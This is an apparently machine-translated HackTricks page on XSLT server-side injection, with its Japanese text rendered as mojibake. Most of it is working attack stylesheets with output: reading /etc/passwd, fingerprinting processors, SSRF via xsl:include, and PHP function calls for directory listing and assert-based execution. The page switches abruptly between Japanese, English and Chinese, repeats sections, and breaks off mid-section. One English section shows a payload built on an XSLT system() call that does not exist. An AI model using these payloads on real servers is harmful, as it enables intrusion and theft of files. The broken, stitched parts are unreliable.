# XSLTã‚µãƒ¼ãƒãƒ¼ã‚µã‚¤ãƒ‰ã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ï¼ˆExtensible Stylesheet Language Transformationsï¼‰

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* **ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¼šç¤¾**ã§åƒã„ã¦ã„ã¾ã™ã‹ï¼Ÿ **HackTricksã§ä¼šç¤¾ã‚’å®£ä¼**ã—ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€**PEASSã®æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ãŸã‚Šã€HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„ã§ã™ã‹ï¼Ÿ[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã¾ã—ã‚‡ã†ã€ç§ãŸã¡ã®ç‹¬å çš„ãª[**NFT**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³
* [**å…¬å¼ã®PEASSï¼†HackTricksã®ã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ **ã™ã‚‹ã‹ã€**Twitter**ã§ç§ã‚’**ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€[hacktricksãƒªãƒã‚¸ãƒˆãƒª](https://github.com/carlospolop/hacktricks)ã¨[hacktricks-cloudãƒªãƒã‚¸ãƒˆãƒª](https://github.com/carlospolop/hacktricks-cloud)ã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>

XMLãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆã‚’åˆ¥ã®å½¢å¼ã«å¤‰æ›ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚ãƒãƒ¼ã‚¸ãƒ§ãƒ³ï¼š1ã€2ã€ãŠã‚ˆã³3ï¼ˆ1ãŒæœ€ã‚‚ä½¿ç”¨ã•ã‚Œã¦ã„ã¾ã™ï¼‰ã€‚
å¤‰æ›ã¯ã‚µãƒ¼ãƒãƒ¼ã¾ãŸã¯ãƒ–ãƒ©ã‚¦ã‚¶ã§è¡Œã†ã“ã¨ãŒã§ãã¾ã™ã€‚

æœ€ã‚‚ä½¿ç”¨ã•ã‚Œã‚‹ãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ã¯ã€**Libxslt**ï¼ˆGnomeï¼‰ã€**Xalan**ï¼ˆApacheï¼‰ã€ãŠã‚ˆã³**Saxon**ï¼ˆSaxonicaï¼‰ã§ã™ã€‚

ã“ã®ç¨®ã®è„†å¼±æ€§ã‚’æ‚ªç”¨ã™ã‚‹ã«ã¯ã€ã‚µãƒ¼ãƒãƒ¼ã‚µã‚¤ãƒ‰ã«xslã‚¿ã‚°ã‚’ä¿å­˜ã—ã€ãã®ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ã“ã®ç¨®ã®è„†å¼±æ€§ã®ä¾‹ã¯ã€[https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/](https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/)ã§è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

## ä¾‹ - ãƒãƒ¥ãƒ¼ãƒˆãƒªã‚¢ãƒ«
```bash
sudo apt-get install default-jdk
sudo apt-get install libsaxonb-java libsaxon-java
```
{% code title="xml.xml" %}
```markup
<?xml version="1.0" encoding="UTF-8"?>
<catalog>
<cd>
<title>CD Title</title>
<artist>The artist</artist>
<company>Da Company</company>
<price>10000</price>
<year>1760</year>
</cd>
</catalog>
```
{% code title="xsl.xsl" %}
```markup
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
<html>
<body>
<h2>The Super title</h2>
<table border="1">
<tr bgcolor="#9acd32">
<th>Title</th>
<th>artist</th>
</tr>
<tr>
<td><xsl:value-of select="catalog/cd/title"/></td>
<td><xsl:value-of select="catalog/cd/artist"/></td>
</tr>
</table>
</body>
</html>
</xsl:template>
</xsl:stylesheet>
```
{% endcode %}

å®Ÿè¡Œã™ã‚‹ï¼š
```markup
$ saxonb-xslt -xsl:xsl.xsl xml.xml

Warning: at xsl:stylesheet on line 2 column 80 of xsl.xsl:
Running an XSLT 1.0 stylesheet with an XSLT 2.0 processor
<html>
<body>
<h2>The Super title</h2>
<table border="1">
<tr bgcolor="#9acd32">
<th>Title</th>
<th>artist</th>
</tr>
<tr>
<td>CD Title</td>
<td>The artist</td>
</tr>
</table>
</body>
</html>
```
### ãƒ•ã‚£ãƒ³ã‚¬ãƒ¼ãƒ—ãƒªãƒ³ãƒˆ

{% code title="detection.xsl" %}
```markup
<?xml version="1.0" encoding="ISO-8859-1"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
Version: <xsl:value-of select="system-property('xsl:version')" /><br />
Vendor: <xsl:value-of select="system-property('xsl:vendor')" /><br />
Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')" /><br />
<xsl:if test="system-property('xsl:product-name')">
Product Name: <xsl:value-of select="system-property('xsl:product-name')" /><br />
</xsl:if>
<xsl:if test="system-property('xsl:product-version')">
Product Version: <xsl:value-of select="system-property('xsl:product-version')" /><br />
</xsl:if>
<xsl:if test="system-property('xsl:is-schema-aware')">
Is Schema Aware ?: <xsl:value-of select="system-property('xsl:is-schema-aware')" /><br />
</xsl:if>
<xsl:if test="system-property('xsl:supports-serialization')">
Supports Serialization: <xsl:value-of select="system-property('xsl:supportsserialization')"
/><br />
</xsl:if>
<xsl:if test="system-property('xsl:supports-backwards-compatibility')">
Supports Backwards Compatibility: <xsl:value-of select="system-property('xsl:supportsbackwards-compatibility')"
/><br />
</xsl:if>
</xsl:template>
</xsl:stylesheet>
```
{% endcode %}

ãã—ã¦å®Ÿè¡Œã—ã¾ã™ã€‚
```markup
$saxonb-xslt -xsl:detection.xsl xml.xml

Warning: at xsl:stylesheet on line 2 column 80 of detection.xsl:
Running an XSLT 1.0 stylesheet with an XSLT 2.0 processor
<h2>XSLT identification</h2><b>Version:</b>2.0<br><b>Vendor:</b>SAXON 9.1.0.8 from Saxonica<br><b>Vendor URL:</b>http://www.saxonica.com/<br>
```
### ãƒ­ãƒ¼ã‚«ãƒ«ãƒ•ã‚¡ã‚¤ãƒ«ã®èª­ã¿å–ã‚Š

{% code title="read.xsl" %}
```markup
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:abc="http://php.net/xsl" version="1.0">
<xsl:template match="/">
<xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')"/>
</xsl:template>
</xsl:stylesheet>
```
{% endcode %}
```markup
$ saxonb-xslt -xsl:read.xsl xml.xml

Warning: at xsl:stylesheet on line 1 column 111 of read.xsl:
Running an XSLT 1.0 stylesheet with an XSLT 2.0 processor
<?xml version="1.0" encoding="UTF-8"?>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
```
### SSRF

SSRFï¼ˆServer-Side Request Forgeryï¼‰ã¯ã€æ”»æ’ƒè€…ãŒã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³å†…ã®ã‚µãƒ¼ãƒãƒ¼å´ã§ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã™ã‚‹è„†å¼±æ€§ã§ã™ã€‚æ”»æ’ƒè€…ã¯ã€ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ãŒä¿¡é ¼ã™ã‚‹ä»–ã®ã‚µãƒ¼ãƒãƒ¼ã«ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€æ”»æ’ƒè€…ã¯å†…éƒ¨ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã¸ã®ã‚¢ã‚¯ã‚»ã‚¹ã‚„ã€å¤–éƒ¨ã‚µãƒ¼ãƒ“ã‚¹ã¸ã®æ”»æ’ƒã‚’è¡Œã†ã“ã¨ãŒã§ãã¾ã™ã€‚

SSRFã®æ”»æ’ƒæ‰‹æ³•ã«ã¯ã€æ¬¡ã®ã‚ˆã†ãªã‚‚ã®ãŒã‚ã‚Šã¾ã™ã€‚

- ãƒªã‚¯ã‚¨ã‚¹ãƒˆã®é€ä¿¡å…ˆã‚’åˆ¶å¾¡ã™ã‚‹ã“ã¨ãŒã§ãã‚‹ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã®æ‚ªç”¨
- ãƒªã‚¯ã‚¨ã‚¹ãƒˆã®é€ä¿¡å…ˆã‚’æŒ‡å®šã™ã‚‹ãŸã‚ã®URLã®æ§‹ç¯‰
- ãƒªã‚¯ã‚¨ã‚¹ãƒˆã®é€ä¿¡å…ˆã‚’æŒ‡å®šã™ã‚‹ãŸã‚ã®ãƒ˜ãƒƒãƒ€ãƒ¼ã®æ‚ªç”¨

SSRFæ”»æ’ƒã‚’é˜²ããŸã‚ã«ã¯ã€ä»¥ä¸‹ã®å¯¾ç­–ã‚’å®Ÿæ–½ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚

- å…¥åŠ›æ¤œè¨¼ã¨ãƒ•ã‚£ãƒ«ã‚¿ãƒªãƒ³ã‚°ã‚’è¡Œã„ã€ä¿¡é ¼ã§ããªã„URLã‚’ãƒ–ãƒ­ãƒƒã‚¯ã™ã‚‹
- å†…éƒ¨ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã¸ã®ã‚¢ã‚¯ã‚»ã‚¹ã‚’åˆ¶é™ã™ã‚‹
- ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒ‘ãƒƒãƒã‚’é©ç”¨ã—ã€è„†å¼±æ€§ã‚’ä¿®æ­£ã™ã‚‹

SSRFæ”»æ’ƒã¯é‡å¤§ãªã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒªã‚¹ã‚¯ã§ã‚ã‚‹ãŸã‚ã€é–‹ç™ºè€…ã‚„ã‚·ã‚¹ãƒ†ãƒ ç®¡ç†è€…ã¯å¸¸ã«æ³¨æ„ã‚’æ‰•ã†å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚
```markup
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:abc="http://php.net/xsl" version="1.0">
<xsl:include href="http://127.0.0.1:8000/xslt"/>
<xsl:template match="/">
</xsl:template>
</xsl:stylesheet>
```
### ãƒãƒ¼ã‚¸ãƒ§ãƒ³

ä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹XSLTãƒãƒ¼ã‚¸ãƒ§ãƒ³ã«ã‚ˆã£ã¦ã€é–¢æ•°ã®æ•°ã¯å¢—æ¸›ã™ã‚‹å ´åˆãŒã‚ã‚Šã¾ã™ï¼š

* [https://www.w3.org/TR/xslt-10/](https://www.w3.org/TR/xslt-10/)
* [https://www.w3.org/TR/xslt20/](https://www.w3.org/TR/xslt20/)
* [https://www.w3.org/TR/xslt-30/](https://www.w3.org/TR/xslt-30/)

## ãƒ•ã‚£ãƒ³ã‚¬ãƒ¼ãƒ—ãƒªãƒ³ãƒˆ

ã“ã‚Œã‚’ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ã—ã¦æƒ…å ±ã‚’å–å¾—ã—ã¦ãã ã•ã„
```markup
<?xml version="1.0" encoding="ISO-8859-1"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
Version: <xsl:value-of select="system-property('xsl:version')" /><br />
Vendor: <xsl:value-of select="system-property('xsl:vendor')" /><br />
Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')" /><br />
<xsl:if test="system-property('xsl:product-name')">
Product Name: <xsl:value-of select="system-property('xsl:product-name')" /><br />
</xsl:if>
<xsl:if test="system-property('xsl:product-version')">
Product Version: <xsl:value-of select="system-property('xsl:product-version')" /><br />
</xsl:if>
<xsl:if test="system-property('xsl:is-schema-aware')">
Is Schema Aware ?: <xsl:value-of select="system-property('xsl:is-schema-aware')" /><br />
</xsl:if>
<xsl:if test="system-property('xsl:supports-serialization')">
Supports Serialization: <xsl:value-of select="system-property('xsl:supportsserialization')"
/><br />
</xsl:if>
<xsl:if test="system-property('xsl:supports-backwards-compatibility')">
Supports Backwards Compatibility: <xsl:value-of select="system-property('xsl:supportsbackwards-compatibility')"
/><br />
</xsl:if>
</xsl:template>
</xsl:stylesheet>
```
## SSRF

SSRFï¼ˆServer-Side Request Forgeryï¼‰ã¯ã€æ”»æ’ƒè€…ãŒã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³å†…ã®ã‚µãƒ¼ãƒãƒ¼å´ã§ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã™ã‚‹è„†å¼±æ€§ã§ã™ã€‚æ”»æ’ƒè€…ã¯ã€å†…éƒ¨ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã¸ã®ã‚¢ã‚¯ã‚»ã‚¹ã‚„å¤–éƒ¨ã‚µãƒ¼ãƒ“ã‚¹ã¸ã®æ”»æ’ƒã‚’è¡Œã†ãŸã‚ã«ã€ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ãŒä¿¡é ¼ã™ã‚‹ãƒªã‚½ãƒ¼ã‚¹ã«ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

SSRFæ”»æ’ƒã¯ã€ä»¥ä¸‹ã®ã‚ˆã†ãªæ–¹æ³•ã§å®Ÿè¡Œã•ã‚Œã‚‹ã“ã¨ãŒã‚ã‚Šã¾ã™ã€‚

1. ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒå…¥åŠ›ã™ã‚‹URLã‚’ä½¿ç”¨ã—ã¦ã€ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ãŒå¤–éƒ¨ãƒªã‚½ãƒ¼ã‚¹ã«ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã™ã‚‹å ´åˆã€æ”»æ’ƒè€…ã¯ä»»æ„ã®URLã‚’æŒ‡å®šã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
2. ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ãŒãƒ­ãƒ¼ã‚«ãƒ«ãƒ•ã‚¡ã‚¤ãƒ«ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã™ã‚‹URLã‚’æ”»æ’ƒè€…ãŒåˆ¶å¾¡ã§ãã‚‹å ´åˆã€æ”»æ’ƒè€…ã¯æ©Ÿå¯†æƒ…å ±ã‚’å–å¾—ã™ã‚‹ãŸã‚ã«ãƒ­ãƒ¼ã‚«ãƒ«ãƒ•ã‚¡ã‚¤ãƒ«ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
3. ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ãŒå†…éƒ¨ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã®ãƒªã‚½ãƒ¼ã‚¹ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã™ã‚‹URLã‚’æ”»æ’ƒè€…ãŒåˆ¶å¾¡ã§ãã‚‹å ´åˆã€æ”»æ’ƒè€…ã¯å†…éƒ¨ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

SSRFæ”»æ’ƒã‚’é˜²ããŸã‚ã«ã¯ã€ä»¥ä¸‹ã®å¯¾ç­–ã‚’å®Ÿæ–½ã™ã‚‹ã“ã¨ãŒé‡è¦ã§ã™ã€‚

1. å…¥åŠ›æ¤œè¨¼ã¨ãƒ•ã‚£ãƒ«ã‚¿ãƒªãƒ³ã‚°ã‚’è¡Œã„ã€ä¿¡é ¼ã§ãã‚‹ãƒªã‚½ãƒ¼ã‚¹ã¸ã®ãƒªã‚¯ã‚¨ã‚¹ãƒˆã®ã¿ã‚’è¨±å¯ã—ã¾ã™ã€‚
2. ãƒ›ãƒ¯ã‚¤ãƒˆãƒªã‚¹ãƒˆã‚’ä½¿ç”¨ã—ã¦ã€è¨±å¯ã•ã‚ŒãŸURLã®ã¿ã‚’ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ãŒä½¿ç”¨ã™ã‚‹ã‚ˆã†ã«ã—ã¾ã™ã€‚
3. ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã™ã‚‹å‰ã«ã€URLã‚’æ­£è¦åŒ–ã—ã€ä¸æ­£ãªãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é˜²ãã¾ã™ã€‚

SSRFæ”»æ’ƒã¯ã€ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã«é‡å¤§ãªè„…å¨ã¨ãªã‚Šã¾ã™ã€‚é©åˆ‡ãªå¯¾ç­–ã‚’å®Ÿæ–½ã™ã‚‹ã“ã¨ã§ã€ã“ã®è„†å¼±æ€§ã‚’é˜²ãã“ã¨ãŒã§ãã¾ã™ã€‚
```markup
<esi:include src="http://10.10.10.10/data/news.xml" stylesheet="http://10.10.10.10//news_template.xsl">
</esi:include>
```
## Javascriptã®ã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³

Javascriptã®ã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã¯ã€ã‚¦ã‚§ãƒ–ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®è„†å¼±æ€§ã‚’æ‚ªç”¨ã—ã¦ã€æ”»æ’ƒè€…ãŒä»»æ„ã®Javascriptã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã§ãã‚‹ã‚ˆã†ã«ã™ã‚‹æ”»æ’ƒæ‰‹æ³•ã§ã™ã€‚ã“ã®æ”»æ’ƒã¯ã€ã‚¦ã‚§ãƒ–ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ãŒãƒ¦ãƒ¼ã‚¶ãƒ¼ã‹ã‚‰ã®å…¥åŠ›ã‚’é©åˆ‡ã«æ¤œè¨¼ã›ãšã«ç›´æ¥å®Ÿè¡Œã™ã‚‹å ´åˆã«ç™ºç”Ÿã—ã¾ã™ã€‚

æ”»æ’ƒè€…ã¯ã€ã‚¦ã‚§ãƒ–ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã«å¯¾ã—ã¦æ‚ªæ„ã®ã‚ã‚‹Javascriptã‚³ãƒ¼ãƒ‰ã‚’é€ä¿¡ã™ã‚‹ã“ã¨ã§ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ãƒ–ãƒ©ã‚¦ã‚¶ä¸Šã§ãã®ã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã•ã›ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€æ”»æ’ƒè€…ã¯ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ã‚»ãƒƒã‚·ãƒ§ãƒ³æƒ…å ±ã‚’ç›—ã¿å‡ºã—ãŸã‚Šã€ä¸æ­£ãªæ“ä½œã‚’è¡Œã£ãŸã‚Šã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

Javascriptã®ã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã‚’é˜²ããŸã‚ã«ã¯ã€å…¥åŠ›æ¤œè¨¼ã¨ã‚¨ã‚¹ã‚±ãƒ¼ãƒ—å‡¦ç†ã‚’é©åˆ‡ã«è¡Œã†å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚å…¥åŠ›æ¤œè¨¼ã¯ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‹ã‚‰ã®å…¥åŠ›ãŒäºˆæœŸã—ãªã„å½¢å¼ã§ã‚ã‚‹å ´åˆã«ã‚¨ãƒ©ãƒ¼ã‚’è¿”ã™ã“ã¨ã§ã€æ”»æ’ƒã‚’é˜²ãå½¹å‰²ã‚’æœãŸã—ã¾ã™ã€‚ã‚¨ã‚¹ã‚±ãƒ¼ãƒ—å‡¦ç†ã¯ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‹ã‚‰ã®å…¥åŠ›ã‚’å®‰å…¨ãªå½¢å¼ã«å¤‰æ›ã™ã‚‹ã“ã¨ã§ã€æ‚ªæ„ã®ã‚ã‚‹ã‚³ãƒ¼ãƒ‰ã®å®Ÿè¡Œã‚’é˜²ãã¾ã™ã€‚

Javascriptã®ã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã¯ã€ã‚¦ã‚§ãƒ–ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã«æ·±åˆ»ãªè„…å¨ã‚’ã‚‚ãŸã‚‰ã™å¯èƒ½æ€§ãŒã‚ã‚‹ãŸã‚ã€é–‹ç™ºè€…ã¯å¸¸ã«ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£å¯¾ç­–ã‚’æ„è­˜ã—ã¦ã‚³ãƒ¼ãƒ‡ã‚£ãƒ³ã‚°ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚
```markup
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
<script>confirm("We're good");</script>
</xsl:template>
</xsl:stylesheet>
```
## ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªãƒªã‚¹ãƒˆï¼ˆPHPï¼‰

### **Opendir + readdir**
```markup
<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" >
<xsl:template match="/">
<xsl:value-of select="php:function('opendir','/path/to/dir')"/>
<xsl:value-of select="php:function('readdir')"/> -
<xsl:value-of select="php:function('readdir')"/> -
<xsl:value-of select="php:function('readdir')"/> -
<xsl:value-of select="php:function('readdir')"/> -
<xsl:value-of select="php:function('readdir')"/> -
<xsl:value-of select="php:function('readdir')"/> -
<xsl:value-of select="php:function('readdir')"/> -
<xsl:value-of select="php:function('readdir')"/> -
<xsl:value-of select="php:function('readdir')"/> -
</xsl:template></xsl:stylesheet>
```
### **Assert (var\_dump + scandir + false)**

This technique is used to perform Server-Side Injection (SSI) using the Extensible Stylesheet Language Transformations (XSLT) feature. It involves injecting malicious code into an XSLT stylesheet file to execute arbitrary commands on the server.

#### **Attack Scenario**

1. Identify a vulnerable application that uses XSLT for server-side processing.
2. Locate the XSLT stylesheet file used by the application.
3. Inject malicious code into the XSLT stylesheet file.
4. Craft the payload to execute the desired command on the server.
5. Trigger the XSLT transformation process to execute the payload.
6. Retrieve the output of the executed command.

#### **Payload**

The payload for this technique can vary depending on the specific command you want to execute. However, the general structure of the payload is as follows:

```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
    <xsl:template match="/">
        <xsl:variable name="cmd" select="your_command_here"/>
        <xsl:variable name="output" select="system($cmd)"/>
        <xsl:value-of select="$output"/>
    </xsl:template>
</xsl:stylesheet>
```

Replace `your_command_here` with the command you want to execute. For example, to list the contents of a directory using the `scandir` function in PHP, you can use the following payload:

```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
    <xsl:template match="/">
        <xsl:variable name="cmd" select="php:function('scandir', '.')"/>
        <xsl:variable name="output" select="system($cmd)"/>
        <xsl:value-of select="$output"/>
    </xsl:template>
</xsl:stylesheet>
```

#### **Prevention**

To prevent XSLT Server-Side Injection, follow these best practices:

- Validate and sanitize all user input before using it in XSLT transformations.
- Use a whitelist approach to only allow specific XSLT functions and features.
- Implement proper input/output encoding to prevent injection attacks.
- Regularly update and patch the XSLT processor to mitigate known vulnerabilities.

By following these preventive measures, you can significantly reduce the risk of XSLT Server-Side Injection attacks.
```markup
<?xml version="1.0" encoding="UTF-8"?>
<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
<body style="font-family:Arial;font-size:12pt;background-color:#EEEEEE">
<xsl:copy-of name="asd" select="php:function('assert','var_dump(scandir(chr(46).chr(47)))==3')" />
<br />
</body>
</html>
```
## ãƒ•ã‚¡ã‚¤ãƒ«ã®èª­ã¿å–ã‚Š

### **å†…éƒ¨ - PHP**
```markup
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:abc="http://php.net/xsl" version="1.0">
<xsl:template match="/">
<xsl:value-of select="unparsed-text('/etc/passwd', â€˜utf-8')"/>
</xsl:template>
</xsl:stylesheet>
```
### **å†…éƒ¨ - XXE**

XXEï¼ˆå¤–éƒ¨å®ä½“æ³¨å…¥ï¼‰æ˜¯ä¸€ç§æ”»å‡»æŠ€æœ¯ï¼Œåˆ©ç”¨äº†XMLè§£æå™¨çš„æ¼æ´ï¼Œå…è®¸æ”»å‡»è€…è¯»å–æœåŠ¡å™¨ä¸Šçš„æ–‡ä»¶ã€æ‰§è¡Œè¿œç¨‹è¯·æ±‚å’Œè¿›è¡Œå…¶ä»–æ¶æ„æ“ä½œã€‚åœ¨å†…éƒ¨æ¸—é€æµ‹è¯•ä¸­ï¼ŒXXEå¯ä»¥ç”¨äºè·å–æ•æ„Ÿä¿¡æ¯ã€å‘èµ·æ”»å‡»é“¾æˆ–è¿›ä¸€æ­¥æ¢æµ‹ç›®æ ‡ç³»ç»Ÿã€‚

#### **1. æ£€æµ‹XXEæ¼æ´**

è¦æ£€æµ‹ç›®æ ‡ç³»ç»Ÿæ˜¯å¦å­˜åœ¨XXEæ¼æ´ï¼Œå¯ä»¥å°è¯•ä»¥ä¸‹æ–¹æ³•ï¼š

- å‘é€å¸¦æœ‰å¤–éƒ¨å®ä½“å¼•ç”¨çš„XMLè¯·æ±‚ï¼Œè§‚å¯Ÿæ˜¯å¦è¿”å›äº†æ•æ„Ÿä¿¡æ¯ã€‚
- å°è¯•ä½¿ç”¨å·²çŸ¥çš„XXEæ¼æ´åˆ©ç”¨å·¥å…·ï¼Œå¦‚XXEinjectoræˆ–Burp Suiteçš„XXEæ¼æ´æ‰«æå™¨ã€‚

#### **2. åˆ©ç”¨XXEæ¼æ´**

ä¸€æ—¦ç¡®è®¤ç›®æ ‡ç³»ç»Ÿå­˜åœ¨XXEæ¼æ´ï¼Œå¯ä»¥å°è¯•ä»¥ä¸‹åˆ©ç”¨æ–¹æ³•ï¼š

